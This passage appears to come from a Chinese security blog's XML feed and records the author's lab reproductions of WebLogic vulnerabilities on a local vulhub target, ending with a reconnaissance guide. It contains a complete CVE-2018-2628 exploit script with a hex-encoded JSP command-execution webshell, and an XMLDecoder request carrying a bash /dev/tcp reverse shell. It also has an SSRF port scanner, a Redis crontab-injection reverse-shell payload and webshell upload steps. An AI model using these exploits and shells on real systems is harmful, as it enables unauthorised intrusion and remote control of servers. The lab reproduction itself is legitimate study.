-a #查看要进入容器的id docker exec -ti 容器id或容器名称 /bin/bash 方法二来自github上的一个python脚本，可以使用该方法执行一些命令 地址：https://github.com/jas502n/CVE-2018-2628 执行脚本：(基于python2)# -*- coding: utf-8 -*- import socket import time import sys import re dip = str(sys.argv[1]) dport = int(sys.argv[2]) VUL=[&#39;CVE-2018-2628&#39;] #remote ip changed toremote ip:104.251.228.50 #PAYLOAD=[&#39;aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078&#39;] VER_SIG=[&#39;\\$Proxy[0-9]+&#39;] # 0x01 获取weblogic版本 def t3handshake(sock,server_addr): sock.connect(server_addr) sock.send(&#39;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#39;.decode(&#39;hex&#39;)) time.sleep(1) sock.recv(1024) print &#39;handshake successful&#39; # 0x02 def buildT3RequestObject(sock,port): data1 = &#39;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#39; data2 = &#39;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#39;.format(&#39;{:04x}&#39;.format(dport)) data3 = &#39;1a7727000d3234322e323134&#39; data4 = &#39;2e312e32353461863d1d0000000078&#39; for d in [data1,data2,data3,data4]: sock.send(d.decode(&#39;hex&#39;)) time.sleep(2) print &#39;send request payload successful,recv length:%d&#39;%(len(sock.recv(2048))) #0x03 getshell def sendGetShell(sock,data): s1 = &quot;00000767056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d4&quot; shell_file = &quot;3c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d&quot; filename = (str(sys.argv[3])).encode(&quot;hex&quot;) #print &quot;\n&gt;&gt;&gt;shell filename: %s &gt;&gt;16-hex %s&quot; % (str(sys.argv[3]),filename) #print &quot;\n\n&quot; s3 = &quot;0d0a253e7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c%sc0807702005c7878fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&quot; % (filename) payload1 = s1 + shell_file + s3 #print &quot;GetShell Payload: %s&quot; % payload1 #print &quot;\n\n&quot; print &quot;\n\n &gt;&gt;&gt;&gt;usage: python cve-2018-2628.py ip port shell1.jsp \n\n&quot; print &quot;\n&gt;&gt;&gt;Shell File Upload Dir: \n\n&quot;, r&quot;servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\%s&quot; % (str(sys.argv[3])) print for i in [payload1]: sock.send(i.decode(&quot;hex&quot;)) time.sleep(2) url = &quot;http://&quot; + dip + &quot;:&quot; + str(dport) print &quot;\n&gt;&gt;&gt;Getshell: %s/bea_wls_internal/%s?tom=d2hvYW1pCg==&quot; % (url, (str(sys.argv[3]))) def run(dip,dport,index): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整 sock.settimeout(20) server_addr = (dip, dport) t3handshake(sock,server_addr) #buildT3RequestObject(sock,dport) rs=sendGetShell(sock,PAYLOAD[index]) #print &#39;rs&#39;,rs if __name__==&quot;__main__&quot;: run(dip,dport,0) 执行命令：python CVE-2018-2628-Getshell.py 目标地址 目标端口 test11.jsp (注意: 上面test11.jsp为你起的文件名，改名字需要长度等于10) 执行结果：root@kali:~/桌面# python CVE-2018-2628-Getshell.py 192.168.220.141 7001 test11.jsp handshake successful &gt;&gt;&gt;&gt;usage: python cve-2018-2628.py ip port shell1.jsp &gt;&gt;&gt;Shell File Upload Dir: servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\test11.jsp &gt;&gt;&gt;Getshell: http://192.168.220.141:7001/bea_wls_internal/test11.jsp?tom=d2hvYW1pCg== root@kali:~/桌面# 现在我们已经获取了一个地址，打开浏览器访问它： 我们执行了whoami的命令。上面 tom 后面的变量即为 whomai 的base64编码，我们可以使用 kali 来生成任意base64编码，来替换该变量，以达到执行任意命令： root@kali:~# echo &quot;uname -a&quot; | base64 dW5hbWUgLWEK 不难发现，上面的test11变为了test12，是因为在进行多次测试的时候发现，生成完一次脚本的连接仅能访问一次，第二次访问会返回404… 总结虽然上面的复现都执行成功了，但是我还是不太理解，脚本还不明白，以后要继续看，最好是能够自己学习写脚本。]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Weblogic复现之XML Decoder反序列化]]></title>
    <url>%2F2019%2F07%2F26%2Fweblogic-fu-xian-zhi-xml-decoder-fan-xu-lie-hua%2F</url>
    <content type="text"><![CDATA[前言今天复现XML Decoder反序列化漏洞。 涉及版本 10.3.6.0.0 12.1.3.0.0 12.2.1.1.0 漏洞地址 /wls-wsat/CoordinatorPortType /wls-wsat/RegistrationPortTypeRPC /wls-wsat/ParticipantPortType /wls-wsat/RegistrationRequesterPortType /wls-wsat/CoordinatorPortType11 /wls-wsat/RegistrationPortTypeRPC11 /wls-wsat/ParticipantPortType11 /wls-wsat/RegistrationRequesterPortType11 复现攻击简单的漏洞证明 检测漏洞 检测脚本： import requests headers = { &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0&#39;, &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;, &#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;, &#39;Content-Type&#39;: &#39;text/xml&#39; } def Webogic_XMLDecoder_poc(url): posturl=url+&#39;/wls-wsat/CoordinatorPortType&#39; data = &#39;&#39;&#39; &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class=&quot;java.io.PrintWriter&quot;&gt; &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt&lt;/string&gt;&lt;void method=&quot;println&quot;&gt; &lt;string&gt;xmldecoder_vul_test&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt; &lt;/object&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; &#39;&#39;&#39; print (url) try: r=requests.post(posturl,data=data,headers=headers,timeout=5) geturl=url+&quot;/wls-wsat/test.txt&quot; print (geturl) check_result = requests.get(geturl,headers=headers,timeout=5) if &#39;xmldecoder_vul_test&#39; in check_result.text: print (&quot;[+]存在WebLogic WLS远程执行漏洞(CVE-2017-10271)&quot;) except: print (&quot;[-]不存在WebLogic WLS远程执行漏洞(CVE-2017-10271)&quot;) if __name__ == &#39;__main__&#39;: url = &quot;http://192.168.220.141:7001&quot; #目标url Webogic_XMLDecoder_poc(url) 执行结果： http://192.168.220.141:7001 http://192.168.220.141:7001/wls-wsat/test.txt [+]存在WebLogic WLS远程执行漏洞(CVE-2017-10271) 写入webshell 漏洞地址为：http://192.168.220.141:7001/wls-wsat/CoordinatorPortType burp抓包，转发到repeater下 将GET变为POST，并将Webshell写下，点击Go按钮， 访问http://192.168.220.141:7001/bea_wls_internal/test.jsp 反弹shell 漏洞检测 工具利用： XML反序列化漏洞检查工具 脚本利用： 上面的检测脚本 burp抓包，转发到Repeater，攻击机开启端口监听 将GET改为POST，传入反弹shell脚本 POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: 192.168.220.141:7001 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: text/xml Content-Length: 645 &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt; &lt;void index=&quot;0&quot;&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=&quot;1&quot;&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=&quot;2&quot;&gt; &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.220.141/4444 0&amp;gt;&amp;amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; 反弹shell成功！！！ root@localhost:vulhub/weblogic/CVE-2017-10271# nc -lvvp 4444 Listening on [0.0.0.0] (family 0, port 4444) Connection from [172.21.0.2] port 4444 [tcp/*] accepted (family 2, sport 45968) bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell root@f84f979b36de:~/Oracle/Middleware/user_projects/domains/base_domain# whoami &lt;Middleware/user_projects/domains/base_domain# whoami root root@f84f979b36de:~/Oracle/Middleware/user_projects/domains/base_domain#]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Weblogic复现之ssrf]]></title>
    <url>%2F2019%2F07%2F25%2Fweblogic-fu-xian-zhi-ssrf%2F</url>
    <content type="text"><![CDATA[前言今天复现weblogic中的ssrf漏洞，以前也没学过ssrf，所以趁着这个机会再把ssrf学习一下。 ssrf介绍SSRF(Server-Side Request Forgery，服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统)。 嗯，上面都是书上写的，我还不太理解。。。。。。。。 漏洞原理SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。 SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。 主要攻击方式如下： 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息 攻击运行在内网或本地的应用程序 对内网web应用进行指纹识别，识别企业内部的资产信息 攻击内外网的web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2，SQli等) 利用file协议读取本地文件等 ssrf漏洞利用weblogic之ssrf环境搭建 涉及版本 10.0.2 10.3.6 环境部署 进入ssrf环境 cd vulhub/weblogic/ssrf 环境构建 sudo docker-compose build 启动环境 sudo docker-compose up -d 靶机配置 靶机IP： 192.168.220.141端口： 7001漏洞地址： http://192.168.220.141:7001/uddiexplorer/SearchPublicRegistries.jsp 复现攻击 漏洞检测 检测脚本： #!/usr/bin/env python # -*- coding: utf-8 -*- import re import sys import Queue import requests import threading from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) queue = Queue.Queue() mutex = threading.Lock() class Test(threading.Thread): def __init__(self, queue): threading.Thread.__init__(self) self.queue = queue def check(self,domain,ip): payload = &quot;uddiexplorer/SearchPublicRegistries.jsp?operator={ip}&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&quot;.format(ip=ip) url = domain + payload try: html = requests.get(url=url, timeout=15, verify=False).content m = re.search(&#39;weblogic.uddi.client.structures.exception.XML_SoapException&#39;,html) if m: mutex.acquire() with open(&#39;ssrf1.txt&#39;,&#39;a+&#39;) as f: print &quot;%s has weblogic ssrf.&quot; % domain f.write(&quot;%s has weblogic ssrf.&quot; % domain) mutex.release() except Exception,e: print e def get_registry(self,domain): payload = &#39;uddiexplorer/SetupUDDIExplorer.jsp&#39; url = domain + payload try: html = requests.get(url=url, timeout=15, verify=False).content m = re.search(&#39;&lt;i&gt;For example: (.*?)/uddi/uddilistener.*?&lt;/i&gt;&#39;,html) if m: return m.group(1) except Exception,e: print e def run(self): while not self.queue.empty(): domain = self.queue.get() mutex.acquire() print domain mutex.release() ip = self.get_registry(domain) self.check(domain,ip) self.queue.task_done() if __name__ == &#39;__main__&#39;: with open(&#39;domain.txt&#39;,&#39;r&#39;) as f: lines = f.readlines() for line in lines: queue.put(line.strip()) for x in xrange(1,50): t = Test(queue) t.setDaemon(True) t.start() queue.join() 检测结果： root@kali:~/桌面# python check_weblogic_ssrf.py http://192.168.220.141:7001/ http://192.168.220.141:7001/ has weblogic ssrf. 手工进行简单检测，在漏洞地址处，点击Search按钮，返回：“An error has occurred”，可从漏洞页面下的“Setup UDDI Explorer”处发现内网地址： 据说实际环境中该处可能会暴露内网地址我们可以根据返回的不同状态信息，来判断内网的IP是否存在以及对应端口是否开放。 内网网段： 10.0.0.0 ~ 10.255.255.255， 172.16.0.0 ~ 172.31.255.255 192.168.0.0 ~ 192.168.255.255 这里有一个地方需要注意的是，需要知道目标内网网段。如果盲目的去进行网段扫描会耗费大量的时间。一个简单的内网服务嗅探: import thread import time import re import requests def ite_ip(ip): for i in range(1, 256): final_ip = &#39;{ip}.{i}&#39;.format(ip=ip, i=i) print final_ip thread.start_new_thread(scan, (final_ip,)) time.sleep(2) def scan(final_ip): ports = (&#39;21&#39;, &#39;22&#39;, &#39;23&#39;, &#39;53&#39;, &#39;80&#39;, &#39;135&#39;, &#39;139&#39;, &#39;443&#39;, &#39;445&#39;, &#39;1080&#39;, &#39;1433&#39;, &#39;1521&#39;, &#39;3306&#39;, &#39;3389&#39;, &#39;4899&#39;, &#39;8080&#39;, &#39;7001&#39;, &#39;8000&#39;,&#39;6389&#39;,&#39;6379&#39;) for port in ports: vul_url = &#39;http://172.20.10.13:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&#39; % (final_ip,port) try: #print vul_url r = requests.get(vul_url, timeout=15, verify=False) result1 = re.findall(&#39;weblogic.uddi.client.structures.exception.XML_SoapException&#39;,r.content) result2 = re.findall(&#39;but could not connect&#39;, r.content) result3 = re.findall(&#39;No route to host&#39;, r.content) if len(result1) != 0 and len(result2) == 0 and len(result3) == 0: print &#39;[!]&#39;+final_ip + &#39;:&#39; + port except Exception, e: pass if __name__ == &#39;__main__&#39;: ip = &quot;172.21.0&quot; if ip: print ip ite_ip(ip) else: print &quot;no ip&quot; 结果： root@kali:~/桌面# python ip_detect.py 172.20.0 172.20.0.1 [!]172.20.0.1:7001 172.20.0.2 [!]172.20.0.2:6379 172.20.0.3 [!]172.20.0.3:7001 172.20.0.4 172.20.0.5 这里我们检测出了一个Redis服务(6379) 利用Redis反弹shell 在前面的探测，我们已经知道了目标系统内网地址存活状态，并发现了一个6379端口主机，根据经验，该端口下的服务是Redis数据库。 下面我们尝试“利用注入HTTP头，来让Redis反弹shell”： Weblogic的SSRF，在使用GET请求时，可以通过“%0a%0d”（\r\n，换行符），来注入换行符。 某些服务（如Redis）是通过换行符来分隔每条命令 因此可以通过该SSRF攻击内网中的Redis服务器 ① 发送三条Redis命令，将反弹shell脚本写入/etc/crontab: set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/7089 0&gt;&amp;1\n\n\n\n&quot; config set dir /etc/ config set dbfilename crontab save ##/etc/crontab 这个文件负责安排由系统管理员制定的维护系统以及其他任务的crontab ##/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。 将命令写成： set 1 &quot;\n\n\n\n* * * * root bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx[这里是你自己的公网IP]/8888[这里是你监听的端口] 0&gt;&amp;1\n\n\n\n&quot; config set dir /etc/config set dbfilename crontab save ② 因为是GET，进行url编码，同时我们还要制定一个要写入的文件test，换行为%0A%0D payload： /uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.20.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.220.133%2F7089%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa&amp;rdoSearch=name&amp;txtSearchname=&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search ③ 在192.168.220.133主机上监听端口8888 root@kali:~# nc -l -p 8888 bash: no job control in this shell [root@76807fba28bc ~]# whoami whoami root [root@76807fba28bc ~]# 反弹shell成功！！！]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Weblogic复现之任意文件上传]]></title>
    <url>%2F2019%2F07%2F24%2Fweblogic-fu-xian-zhi-ren-yi-wen-jian-shang-chuan%2F</url>
    <content type="text"><![CDATA[前言最近在复现weblogic，今天复现一下其中的任意文件上传漏洞。 漏洞说明版本此漏洞涉及版本 10.3.6.0 12.1.3.0 12.2.1.2 12.2.1.3 环境部署 进入该漏洞环境目录 cd vulhub/weblogic/CVE-2018-2094 环境构建 sudo docker-compose build 启动 sudo docker-compose up -d 漏洞复现前提访问http://your-ip:7001/console，即可看到后台登录页面 在CVE-2018-2894环境目录下，查看账号密码，运行以下命令： sudo docker-compose logs | grep password root@localhost:vulhub/weblogic/CVE-2018-2894# docker-compose logs | grep password weblogic_1 | ----&gt; &#39;weblogic&#39; admin password: ofX5JwIc weblogic_1 | admin password : [ofX5JwIc] weblogic_1 | * password assigned to an admin-level user. For * weblogic_1 | * password assigned to an admin-level user. For * 输入用户名和密码，进入后台 勾选在“base_domain”下的“高级”下的“启用web服务测试页”这个选项，点击保存。 复现流程 进入上传界面：http://192.168.220.141:7001/ws_utc/config.do 将“通用”下的“当前工作目录”路径设置为： /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css 为什么呢？将目录设置为ws_utc应用的静态文件css目录，访问这个目录是无需权限的 上传木马 进入“安全”，点击“添加”，点击“浏览”，选择你要上传的jsp木马，点击“提交”即可 按F12，选中上传文件名元素，该标签下有个id元素(时间戳) 上传木马的访问路径 http://your-ip:7001/ws_utc/css/config/keystore/[时间戳id]_[文件名] 我上传的是jsp大马 也可以上传其他木马，用菜刀、蚁剑、冰蝎等连接 总结本次漏洞复现不是特别难，其中还有一些不明白的地方，比如，在时间戳那个地方，我们怎么知道它用了时间戳修改文件名等等。。。]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《渗透测试之信息收集》]]></title>
    <url>%2F2019%2F07%2F19%2Fshen-tou-ce-shi-zhi-xin-xi-shou-ji%2F</url>
    <content type="text"><![CDATA[前言最近学习渗透测试，先从最基本的开始吧。在进行渗透测试之前，最重要的就是信息收集，我们要尽可能地收集目标的信息，越详细越好。 收集域名信息知道目标的域名之后，我们要做的第一件事就是获取域名的注册信息，包括该域名的DNS服务器信息和注册人的联系信息等。 whois查询whois是一个标准的互联网协议，可用于收集网络注册信息，注册的域名，IP地址等信息。 Kali下默认安装whois whois 域名 root@kali:~# whois sec-redclub.com Domain Name: SEC-REDCLUB.COM Registry Domain ID: 1984718078_DOMAIN_COM-VRSN Registrar WHOIS Server: grs-whois.hichina.com Registrar URL: http://www.net.cn Updated Date: 2018-10-22T02:22:15Z Creation Date: 2015-11-30T08:45:51Z Registry Expiry Date: 2019-11-30T08:45:51Z Registrar: Alibaba Cloud Computing (Beijing) Co., Ltd. Registrar IANA ID: 420 Registrar Abuse Contact Email: DomainAbuse@service.aliyun.com Registrar Abuse Contact Phone: +86.95187 Domain Status: ok https://icann.org/epp#ok Name Server: DNS10.HICHINA.COM Name Server: DNS9.HICHINA.COM DNSSEC: unsigned 在线whois查询的常用网站有：爱站工具网站长之家VirusTotal 备案信息查询主要针对国内网站，如果网站搭建在国外，则不需要备案。 常用的网站： ICP备案查询网天眼查 收集敏感信息Google Hacking语法 关键字 说明 Site 指定域名 Intext 网页正文中的关键字 Inurl URL中存在关键字的网页 Filetype 指定文件类型 Intitle 网页标题中的关键字 link link:baidu.com 即表示返回所有和baidu.com做了链接的URL Info 查找指定站点的一些基本信息 cache 搜索Google里关于某些内容的缓存 举个例子：尝试搜索学校网站的后台，语法为：Site:edu.cn intext:后台管理 意思为搜索网页正文中含有“后台管理”并且域名后缀是edu.cn的网站 不仅是Google搜索引擎，还有百度、雅虎、Bing、Shodan等，语法大同小异。 还有，通过Burpsuite的Repeater也可以获取一些服务器的信息，如服务器的server类型及版本，PHP的版本信息等。 收集子域名信息子域名也就是二级域名，是指顶级域名下的域名。如果我们的目标网络规模比较大，直接从主域入手难度太大，所有不如先从目标的某个子域入手，再想办法接近目标。 子域名检测工具用于子域名检测的工具有很多，比如，Layer子域名挖掘机、wydomain、Sublist3r、dnsmaper、subDomainsBrute等等。 Layer子域名挖掘机 直接输入域名进行扫描 subDomainsBrute 可以用小字典递归地发现三级、四级，甚至五级域名等不容易被探测到的域名 执行命令： python subDomainsbrute.py xxx.com Sublist3r 列举多种资源，如在Google、Bing、Baidu等搜索引擎中查到的子域名，还可以列出VirusTotal、DNSdumpster等查到的子域名 搜索引擎枚举可以利用Google语法搜索子域名，例如搜索Baidu的子域名，使用site:baidu.com 收集常用端口信息通过扫描服务器开放的端口以及从该端口判断服务器上存在的服务，便于渗透目标服务器。 最常见的工具就是nmap，还有Masscan、ZMap等工具。 指纹识别这里的指纹是指网站cms指纹识别、计算机操作系统及web容器的指纹识别等。 应用程序一般在html、js、css等文件中多多少少会包含一些特征码，比如WordPress在robots.txt中会包含wp-admin、首页index.php中包含generator=wordpress 3.xx，这个特征就是cms的指纹。当碰到这些特征时，就可以快速识别出该cms，所以叫指纹识别。 常见的cms有dedecms(织梦)、discuz、PHPWEB、PHPCMS、帝国、WordPress等。 常用的工具有：御剑web指纹识别、WhatWeb、WebRobo、轻量WEB指纹识别等。 除了这些工具，还有一些在线网站查询cms指纹识别 BugScaner: http://whatweb.bugscaner.com/look 云悉指纹: http://www.yunsee.cn/finger.html whatweb: https://whatweb.net 